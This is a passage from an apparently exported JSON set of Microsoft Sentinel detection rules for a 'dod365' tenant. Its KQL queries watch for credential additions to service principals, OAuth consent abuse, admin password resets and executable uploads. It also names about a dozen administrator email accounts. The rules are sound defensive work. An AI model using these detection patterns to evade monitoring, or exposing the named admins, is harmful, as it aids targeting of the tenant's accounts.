InitiatingIpAddress","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":["T1550"],"displayName":"New access credential added to Application or Service Principal","enabled":true,"description":"'This will alert when an admin or app owner account adds a new credential to an Application or Service Principal where a verify KeyCredential was already present for the app.\n  If a threat actor obtains access to an account with sufficient privileges and adds the alternate authentication material triggering this event, the threat actor can now authenticate as the Application or Service Principal using this credential.\n  Additional information on OAuth Credential Grants can be found in RFC 6749 Section 4.4 or https://docs.microsoft.com/azure/active-directory/develop/v2-oauth2-client-creds-grant-flow\n  For further information on AuditLogs please see https://docs.microsoft.com/azure/active-directory/reports-monitoring/reference-audit-activities.'\nPLATFORM:Azure AD,IaaS,Microsoft 365,Windows\nMITRE:TA0003;T1098;T1098.001,TA0004;T1098;T1098.001,TA0005;T1556;T1556.006;T1556.007,TA0006;T1552","alertRuleTemplateName":"79566f41-df67-4e10-a703-c38a6213afd8","lastModifiedUtc":"2024-10-02T21:38:54.9112332Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/589fd18d-70b0-4a6f-9583-89059f149c5d","name":"589fd18d-70b0-4a6f-9583-89059f149c5d","etag":"\"37000b1f-0000-2700-0000-6346e1c80000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"// Adjust this value to change how many Teams should be deleted before including\nlet max_delete_count = 10;\n// Adjust this value to change the timewindow the query runs over\n  OfficeActivity\n| where OfficeWorkload =~ \"MicrosoftTeams\" \n| where Operation =~ \"TeamDeleted\"\n| where UserId != \"Application\"\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated), DeletedTeams = make_set(TeamName) by UserId\n| where array_length(DeletedTeams) > max_delete_count","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":false,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserId"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Impact"],"techniques":["T1485","T1489"],"displayName":"Multiple Teams deleted by a single user","enabled":false,"description":"This detection flags the occurrences of deleting multiple teams within an hour.\nThis data is a part of Office 365 Connector in Azure Sentinel.","alertRuleTemplateName":"173f8699-6af5-484a-8b06-8c47ba89b380","lastModifiedUtc":"2022-10-12T15:48:24.6526065Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/989889d3-e6c0-47b8-be83-adf38450da02","name":"989889d3-e6c0-47b8-be83-adf38450da02","etag":"\"d600958c-0000-2700-0000-65a7cd650000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"let timeframe = 1d;\nlet PerUserThreshold = 0;\nlet TotalThreshold = 100;\nlet action = dynamic([\"change\", \"changed\", \"reset\"]);\nlet pWord = dynamic([\"password\", \"credentials\"]);\nlet Admins = dynamic([\"UMiller@dod365.onmicrosoft.us\", \"dodina@dod365.onmicrosoft.us\", \"jcrawford@dod365.onmicrosoft.us\", \"rBunch@dod365.onmicrosoft.us\", \"cfranklin@dod365.onmicrosoft.us\", \"KRadford@dod365.onmicrosoft.us\", \"churt@dod365.onmicrosoft.us\", \" MSookbang@dod365.onmicrosoft.us\", \"pdethier@dod365.onmicrosoft.us\", \"JLahr@dod365.onmicrosoft.us\", \"WBrown@dod365.onmicrosoft.us\", \"cgriffin@dod365.onmicrosoft.us\" ]);\nlet PasswordResetMultiDataSource =\n(union isfuzzy=true\n(//Password reset events\n//4723: An attempt was made to change an account's password\n//4724: An attempt was made to reset an accounts password\nSecurityEvent\n| where TimeGenerated >= ago(timeframe)\n| where EventID in (\"4723\",\"4724\")\n| project TimeGenerated, Computer, AccountType, Account, Type),\n(//Azure Active Directory Password reset events\nAuditLogs\n| where TimeGenerated >= ago(timeframe)\n| where OperationName has_any (pWord) and OperationName has_any (action)\n| extend AccountType = tostring(TargetResources[0].type), Account = tostring(TargetResources[0].userPrincipalName), TargetResourceName = tolower(tostring(TargetResources[0].displayName))\n// Added the following line to only look for GA's\n| where Account has_any (Admins)\n| project TimeGenerated, AccountType, Account, Computer = TargetResourceName, Type),\n(//OfficeActive ActiveDirectory Password reset events\nOfficeActivity\n| where TimeGenerated >= ago(timeframe)\n| where OfficeWorkload == \"AzureActiveDirectory\" \n| where (ExtendedProperties has_any (pWord) or ModifiedProperties has_any (pWord)) and (ExtendedProperties has_any (action) or ModifiedProperties has_any (action))\n| extend AccountType = UserType, Account = OfficeObjectId \n| project TimeGenerated, AccountType, Account, Type, Computer = \"\"),\n(// Unix syslog password reset events\nSyslog\n| where TimeGenerated >= ago(timeframe)\n| where Facility in (\"auth\",\"authpriv\")\n| where SyslogMessage has_any (pWord) and SyslogMessage has_any (action)\n| extend AccountType = iif(SyslogMessage contains \"root\", \"Root\", \"Non-Root\")\n| parse SyslogMessage with * \"password changed for\" Account\n| project TimeGenerated, AccountType, Account, Computer = HostName, Type),\n(SigninLogs\n| where TimeGenerated >= ago(timeframe)\n| where OperationName =~ \"Sign-in activity\" and ResultType has_any (\"50125\", \"50133\")\n| project TimeGenerated, AccountType = AppDisplayName, Computer = IPAddress, Account = UserPrincipalName, Type\n// Added the following line to only look for GA's\n| where Account has_any (Admins)\n)\n);\nlet pwrmd = PasswordResetMultiDataSource\n| project TimeGenerated, Computer, AccountType, Account, Type;\n(union isfuzzy=true  \n(pwrmd\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), Computer = makeset(Computer), AccountType = makeset(AccountType), Total=count() by Account, Type\n// removed the threshold because the query is only looking at GA's now\n//| where Total > PerUserThreshold\n| extend ResetPivot = \"PerUserReset\"),  \n(pwrmd\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), Computer = makeset(Computer), Account = tostring(makeset(Account)), AccountType = makeset(AccountType), Total=count() by Type\n// removed the threshold because the query is only looking at GA's now\n//| where Total > TotalThreshold\n| extend ResetPivot = \"TotalUserReset\")\n)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"Account"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess","CredentialAccess"],"techniques":["T1078","T1110"],"displayName":"Multiple Password Reset by user","enabled":true,"description":" This query will determine multiple password resets by user across multiple data sources. \nAccount manipulation including password reset may aid adversaries in maintaining access to credentials \nand certain permission levels within an environment.\n\nThis query only looks for password resets done by/for Global Administrator accounts. Password resets are not enabled for any other user account.","alertRuleTemplateName":"0b9ae89d-8cad-461c-808f-0494f70ad5c4","lastModifiedUtc":"2024-01-17T12:51:48.618356Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/ed72b504-a7cc-4290-ae72-6d8dfbeee3f9","name":"ed72b504-a7cc-4290-ae72-6d8dfbeee3f9","etag":"\"f304024f-0000-2700-0000-62b99c5c0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P7D","queryPeriod":"P8D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"// a threshold can be enabled, see commented line below for PrevSeenCount\n//let threshold = 2;\nlet uploadOp = 'FileUploaded';\n// Extensions that are interesting. Add/Remove to this list as you see fit\nlet execExt = dynamic(['exe', 'inf', 'gzip', 'cmd', 'bat']);\nlet starttime = 8d;\nlet endtime = 1d;\nOfficeActivity \n| where TimeGenerated between (ago(starttime) .. ago(endtime))\n// Limited to File Uploads due to potential noise, comment out the Operation statement below to include any operation type\n// Additional, but potentially noisy operation types that include Uploads and Downloads can be included by adding the following - Operation contains \"upload\" or Operation contains \"download\"\n| where Operation =~ uploadOp\n| where SourceFileExtension has_any (execExt)\n| project TimeGenerated, OfficeId, OfficeWorkload, RecordType, Operation, UserType, UserKey, UserId, ClientIP, UserAgent, Site_Url, SourceRelativeUrl, SourceFileName\n| extend SiteUrlUserFolder = tolower(split(Site_Url, '/')[-2])\n| extend UserIdUserFolderFormat = tolower(replace('@|\\\\.', '_',UserId))\n// identify when UserId is not a match to the specific site url personal folder reference\n| extend UserIdDiffThanUserFolder = iff(Site_Url has '/personal/' and SiteUrlUserFolder != UserIdUserFolderFormat, true , false ) \n// identify if any files have been deleted since being uploaded\n| join kind= leftanti (\n    OfficeActivity \n    | where TimeGenerated between (ago(starttime) .. ago(1m))\n    | where Operation startswith \"FileDeleted\"\n) on SourceFileName\n| summarize TimeGenerated = make_list(TimeGenerated), StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), UserAgents = make_list(UserAgent), SourceRelativeUrls = make_list(SourceRelativeUrl), FileNames = make_list(SourceFileName) by OfficeWorkload, RecordType, Operation, UserType, UserId, ClientIP, Site_Url, UserIdDiffThanUserFolder\n| project-reorder TimeGenerated, UserId, Site_Url, SourceRelativeUrls, FileNames","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":false,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserId"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"ClientIP"}]},{"entityType":"File","fieldMappings":[{"identifier":"Name","columnName":"FileNames"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CommandAndControl"],"techniques":["T1105"],"displayName":"New executable via Office FileUploaded Operation","enabled":false,"description":"Identifies when executable file types are uploaded to Office services such as SharePoint and OneDrive.\nList currently includes 'exe', 'inf', 'gzip', 'cmd', 'bat' file extensions.\nAdditionally, identifies when a given user is uploading these files to another users workspace.\nThis may be indication of a staging location for malware or other malicious activity.","alertRuleTemplateName":"d722831e-88f5-4e25-b106-4ef6e29f8c13","lastModifiedUtc":"2022-06-27T12:02:36.7926843Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/7e0e11ef-2131-4902-8df0-5ba57e5cefa7","name":"7e0e11ef-2131-4902-8df0-5ba57e5cefa7","etag":"\"d600afb3-0000-2700-0000-65a7ce550000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"let detectionTime = 1d;\nlet joinLookback = 14d;\nAuditLogs\n| where TimeGenerated > ago(detectionTime)\n| where LoggedByService =~ \"Core Directory\"\n| where Category =~ \"ApplicationManagement\"\n| where OperationName =~ \"Consent to application\"\n| where TargetResources has \"offline\"\n| extend AppDisplayName = TargetResources.[0].displayName\n| extend AppClientId = tolower(TargetResources.[0].id)\n| where AppClientId !in ((externaldata(knownAppClientId:string, knownAppDisplayName:string)[@\"https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/Sample%20Data/Feeds/Microsoft.OAuth.KnownApplications.csv\"] with (format=\"csv\")))\n| extend ConsentFull = TargetResources[0].modifiedProperties[4].newValue\n| parse ConsentFull with * \"ConsentType: \" GrantConsentType \", Scope: \" GrantScope1 \"]\" *\n| where ConsentFull contains \"offline_access\" and ConsentFull contains \"Files.Read\" or ConsentFull contains \"Mail.Read\" or ConsentFull contains \"Notes.Read\" or ConsentFull contains \"ChannelMessage.Read\" or ConsentFull contains \"Chat.Read\" or ConsentFull contains \"TeamsActivity.Read\" or ConsentFull contains \"Group.Read\" or ConsentFull contains \"EWS.AccessAsUser.All\" or ConsentFull contains \"EAS.AccessAsUser.All\"\n| where GrantConsentType != \"AllPrincipals\" // NOTE: we are ignoring if OAuth application was granted to all users via an admin - but admin due diligence should be audited occasionally\n| extend GrantIpAddress = iff(isnotempty(InitiatedBy.user.ipAddress), InitiatedBy.user.ipAddress, InitiatedBy.app.ipAddress)\n| extend GrantInitiatedBy = iff(isnotempty(InitiatedBy.user.userPrincipalName),InitiatedBy.user.userPrincipalName, InitiatedBy.app.displayName)\n| extend GrantUserAgent = iff(AdditionalDetails[0].key =~ \"User-Agent\", AdditionalDetails[0].value, \"\")\n| project TimeGenerated, GrantConsentType, GrantScope1, GrantInitiatedBy, AppDisplayName, GrantIpAddress, GrantUserAgent, AppClientId, OperationName, ConsentFull, CorrelationId\n| join kind = leftouter (AuditLogs\n| where TimeGenerated > ago(joinLookback)\n| where LoggedByService =~ \"Core Directory\"\n| where Category =~ \"ApplicationManagement\"\n| where OperationName =~ \"Add service principal\"\n| extend AppClientId = tolower(TargetResources[0].id)\n| extend AppReplyURLs = iff(TargetResources[0].modifiedProperties[1].newValue has \"AddressType\", TargetResources[0].modifiedProperties[1].newValue, \"\")\n| distinct AppClientId, tostring(AppReplyURLs)\n)\non AppClientId\n| join kind = innerunique (AuditLogs\n| where TimeGenerated > ago(joinLookback)\n| where LoggedByService =~ \"Core Directory\"\n| where Category =~ \"ApplicationManagement\"\n| where OperationName =~ \"Add OAuth2PermissionGrant\" or OperationName =~ \"Add delegated permission grant\"\n| extend GrantAuthentication = tostring(TargetResources[0].displayName)\n| extend GrantOperation = OperationName\n| project GrantAuthentication, GrantOperation, CorrelationId\n) on CorrelationId\n| project TimeGenerated, GrantConsentType, GrantScope1, GrantInitiatedBy, AppDisplayName, AppReplyURLs, GrantIpAddress, GrantUserAgent, AppClientId, GrantAuthentication, OperationName, GrantOperation, CorrelationId, ConsentFull","suppressionDuration":"PT5H","suppressionEnabled":true,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"GrantInitiatedBy"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CredentialAccess"],"techniques":["T1528"],"displayName":"Suspicious application consent for offline access","enabled":true,"description":" This will alert when a user consents to provide a previously-unknown Azure application with offline access via OAuth.\nOffline access will provide the Azure App with access to the listed resources without requiring two-factor authentication.\nConsent to applications with offline access and read capabilities should be rare, especially as the knownApplications list is expanded. Public contributions to expand this filter are welcome!\nFor further information on AuditLogs please see https://docs.microsoft.com/azure/active-directory/reports-monitoring/reference-audit-activities.","alertRuleTemplateName":"3533f74c-9207-4047-96e2-0eb9383be587","lastModifiedUtc":"2024-01-17T12:55:43.5522099Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/0bdb3feb-4668-4ffd-856c-52eb17066f54","name":"0bdb3feb-4668-4ffd-856c-52eb17066f54","etag":"\"02009b19-0000-2700-0000-624904e00000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"let auditLookback = 1d;\nAuditLogs\n| where TimeGenerated > ago(auditLookback)\n| where OperationName has 'StsRefreshTokenValidFrom'\n| where TargetResources[0].modifiedProperties != '[]'\n| where TargetResources[0].modifiedProperties !has 'DirectorySync'\n| extend TargetResourcesModProps = TargetResources[0].modifiedProperties\n| mv-expand TargetResourcesModProps\n| where tostring(TargetResourcesModProps.displayName) =~ 'StsRefreshTokensValidFrom'\n| extend InitiatingUserOrApp = iff(isnotempty(InitiatedBy.user.userPrincipalName),tostring(InitiatedBy.user.userPrincipalName), tostring(InitiatedBy.app.displayName))\n| where InitiatingUserOrApp !in ('Microsoft Cloud App Security')\n| extend targetUserOrApp = TargetResources[0].userPrincipalName\n| extend eventName = tostring(TargetResourcesModProps.displayName)\n| extend oldStsRefreshValidFrom = todatetime(parse_json(tostring(TargetResourcesModProps.oldValue))[0])\n| extend newStsRefreshValidFrom = todatetime(parse_json(tostring(TargetResourcesModProps.newValue))[0])\n| extend tokenMinutesAdded = datetime_diff('minute',newStsRefreshValidFrom,oldStsRefreshValidFrom)\n| extend tokenMinutesRemaining = datetime_diff('minute',TimeGenerated,newStsRefreshValidFrom)\n| project-reorder Result, AADOperationType\n| extend InitiatingIpAddress = iff(isnotempty(InitiatedBy.user.ipAddress), tostring(InitiatedBy.user.ipAddress), tostring(InitiatedBy.app.ipAddress))\n| extend timestamp = TimeGenerated, AccountCustomEntity = InitiatingUserOrApp, IPCustomEntity = InitiatingIpAddress","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CredentialAccess"],"techniques":null,"displayName":"Interactive STS refresh token modifications","enabled":false,"description":"This will show Active Directory Security Token Service (STS) refresh token modifications by Service Principals and Applications other than DirectorySync. Refresh tokens are used to validate identification and obtain access tokens.\nThis event is most often generated when legitimate administrators troubleshoot frequent AAD user sign-ins but may also be generated as a result of malicious token extensions. Confirm that the activity is related to an administrator legitimately modifying STS refresh tokens and check the new token validation time period for high values.\nFor in-depth documentation of AAD Security Tokens, see https://docs.microsoft.com/azure/active-directory/develop/security-tokens.\nFor further information on AuditLogs please see https://docs.microsoft.com/azure/active-directory/reports-monitoring/reference-audit-activities.","alertRuleTemplateName":"4696e072-aca8-4a4f-bf05-89fddc5ac3c9","lastModifiedUtc":"2021-07-01T17:57:59.50602Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/aaa1a414-bc32-463f-9f1a-0b2e789fec03","name":"aaa1a414-bc32-463f-9f1a-0b2e789fec03","etag":"\"87006944-0000-2700-0000-66fdc0420000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"let auditLookback = 1h;\nAuditLogs\n| where TimeGenerated > ago(auditLookback)\n| where OperationName has_any (\"Add service principal\", \"Certificates and secrets management\") // captures \"Add service principal\", \"Add service principal credentials\", and \"Update application â€“ Certificates and secrets management\" events\n| where Result =~ \"success\"\n| mv-expand target = TargetResources\n| where tostring(InitiatedBy.user.userPrincipalName) has \"@\" or tostring(InitiatedBy.app.displayName) has \"@\"\n| extend targetDisplayName = tostring(TargetResources[0].displayName)\n| extend targetId = tostring(TargetResources[0].id)\n| extend targetType = tostring(TargetResources[0].type)\n| extend keyEvents = TargetResources[0].modifiedProperties\n| mv-expand keyEvents\n| where keyEvents.displayName =~ \"KeyDescription\"\n| extend new_value_set = parse_json(tostring(keyEvents.newValue))\n| extend old_value_set = parse_json(tostring(keyEvents.oldValue))\n| where old_value_set == \"[]\"\n| parse new_value_set with * \"KeyIdentifier=\" keyIdentifier:string \",KeyType=\" keyType:string \",KeyUsage=\" keyUsage:string \",DisplayName=\" keyDisplayName:string \"]\" *\n| where keyUsage == \"Verify\"  or keyUsage == \"\"\n| extend UserAgent = iff(AdditionalDetails[0].key == \"User-Agent\",tostring(AdditionalDetails[0].value),\"\")\n| extend InitiatingUserOrApp = iff(isnotempty(InitiatedBy.user.userPrincipalName),tostring(InitiatedBy.user.userPrincipalName), tostring(InitiatedBy.app.displayName))\n| extend InitiatingIpAddress = iff(isnotempty(InitiatedBy.user.ipAddress), tostring(InitiatedBy.user.ipAddress), tostring(InitiatedBy.app.ipAddress))\n// The below line is currently commented out but Azure Sentinel users can modify this query to show only Application or only Service Principal events in their environment\n//| where targetType =~ \"Application\" // or targetType =~ \"ServicePrincipal\"\n| project-away new_value_set, old_value_set\n| project-reorder TimeGenerated, OperationName, InitiatingUserOrApp, InitiatingIpAddress, UserAgent, targetDisplayName, targetId, targetType, keyDisplayName, keyType, keyUsage, keyIdentifier, CorrelationId, TenantId\n| extend timestamp = TimeGenerated, AccountCustomEntity = InitiatingUserOrApp, IPCustomEntity = InitiatingIpAddress","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence","DefenseEvasion","LateralMovement"],"techniques":["T1098","T1550"],"displayName":"First access credential added to Application or Service Principal where no credential was present","enabled":true,"description":"This will alert when an admin or app owner account adds a new credential to an Application or Service Principal where there was no previous verify KeyCredential associated.\nIf a threat actor obtains access to an account with sufficient privileges and adds the alternate authentication material triggering this event, the threat actor can now authenticate as the Application or Service Principal using this credential.\nAdditional information on OAuth Credential Grants can be found in RFC 6749 Section 4.4 or https://docs.microsoft.com/azure/active-directory/develop/v2-oauth2-client-creds-grant-flow\nFor further information on AuditLogs please see https://docs.microsoft.com/azure/active-directory/reports-monitoring/reference-audit-activities.\nPLATFORM:Azure AD,IaaS,Microsoft 365\nMITRE:TA0003;T1098;T1098.001;T1098.003;T1098.005,TA0004;T1098;T1098.001","alertRuleTemplateName":"2cfc3c6e-f424-4b88-9cc9-c89f482d016a","lastModifiedUtc":"2024-10-02T21:50:57.2788246Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/d4b3823f-cb71-4bb0-9cdd-d3a27abca5b4","name":"d4b3823f-cb71-4bb0-9cdd-d3a27abca5b4","etag":"\"87001d3b-0000-2700-0000-66fdbf920000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"AuditLogs\n| where Category =~ \"ApplicationManagement\"\n| where ActivityDisplayName =~ \"Add delegated permission grant\"\n| where Result =~ \"success\"\n| where tostring(InitiatedBy.user.userPrincipalName) has \"@\" or tostring(InitiatedBy.app.displayName) has \"@\"\n| extend props = parse_json(tostring(TargetResources[0].modifiedProperties))\n| mv-expand props\n| extend UserAgent = tostring(AdditionalDetails[0].value)\n| extend InitiatingUser = tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)\n| extend UserIPAddress = tostring(parse_json(tostring(InitiatedBy.user)).ipAddress)\n| extend DisplayName = tostring(props.displayName)\n| extend Permissions = tostring(parse_json(tostring(props.newValue)))\n| where Permissions has_any (\"Mail.Read\", \"Mail.ReadWrite\")\n| extend PermissionsAddedTo = tostring(TargetResources[0].displayName)\n| extend Type = tostring(TargetResources[0].type)\n| project-away props\n| join kind=leftouter(\n  AuditLogs\n  | where ActivityDisplayName has \"Consent to application\"\n  | extend AppName = tostring(TargetResources[0].displayName)\n  | extend AppId = tostring(TargetResources[0].id)\n  | project AppName, AppId, CorrelationId) on CorrelationId\n| project-reorder TimeGenerated, OperationName, InitiatingUser, UserIPAddress, UserAgent, PermissionsAddedTo, Permissions, AppName, AppId, CorrelationId\n| extend timestamp = TimeGenerated, AccountCustomEntity = InitiatingUser, IPCustomEntity = UserIPAddress","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence"],"techniques":["T1098"],"displayName":"Mail.Read Permissions Granted to Application","enabled":true,"description":"This query look for applications that have been granted permissions to Read Mail (Permissions field has Mail.Read) and subsequently has been consented to. This can help identify applications that have been abused to gain access to mailboxes.\nPLATFORM:Azure AD,IaaS,Microsoft 365\nMITRE:TA0003;T1098;T1098.001;T1098.003;T1098.005","alertRuleTemplateName":"2560515c-07d1-434e-87fb-ebe3af267760","lastModifiedUtc":"2024-10-02T21:48:00.7360822Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/d5cacb43-6ab5-4306-9ccf-5bcd157dd45c","name":"d5cacb43-6ab5-4306-9ccf-5bcd157dd45c","etag":"\"8500a1d9-0000-2700-0000-66fdabf70000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// The query_now parameter represents the time (in UTC) at which the scheduled analytics rule ran to produce this alert.\r\n// Enterprise Application DISA-GitLab-CyberAnalytics Object ID is 'ef74f5c4-72e8-49d8-8dd2-2db5f4ec7f6c'\r\n// If needed, confirm through Azure AD > Enterprise Applications with Object ID #.\r\nlet watchlist = (_GetWatchlist('Contrib-Rights-Admin-Whitelist') \r\n| project SearchKey);\r\nAzureActivity \r\n| where TimeGenerated >= ago(24h)\r\n| where OperationNameValue contains \"MICROSOFT.SECURITYINSIGHTS/ALERTRULES/\"\r\n| where Caller !in~ (watchlist) or ActivityStatusValue != \"Success\"\r\n| extend Analytic_Rule_ID = todynamic(Properties_d).resource\r\n| extend Analytic_Rule_ID = split(Analytic_Rule_ID, \"insights/\").[1]\r\n| extend UserRole = todynamic(Authorization).evidence.role\r\n| extend Operation = split(OperationNameValue, \"ALERTRULES/\").[1]\r\n| extend StatusInfo = todynamic(Properties).statusMessage\r\n| extend SuspiciousUser = iif(Caller !in~ (watchlist), \"True\", \"False\")\r\n| where ActivityStatusValue != \"Start\"\r\n| where ActivitySubstatusValue != \"OK\" or SuspiciousUser != \"False\"\r\n| project\r\n    TimeGenerated,\r\n    Analytic_Rule_ID,\r\n    Operation,\r\n    ActivityStatusValue,\r\n    ActivitySubstatusValue,\r\n    SuspiciousUser,\r\n    Caller,\r\n    UserRole,\r\n    CallerIpAddress,\r\n    StatusInfo,\r\n    Claims","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"Caller"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"CallerIpAddress"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Impact"],"techniques":[],"displayName":"Unauthorized analytic changes v2","enabled":true,"description":"This analytic looks for users making unauthorized changes (write or delete) to analytics. This exclusion list identifies those that are permitted to make changes.\nPLATFORM:Azure AD,Microsoft 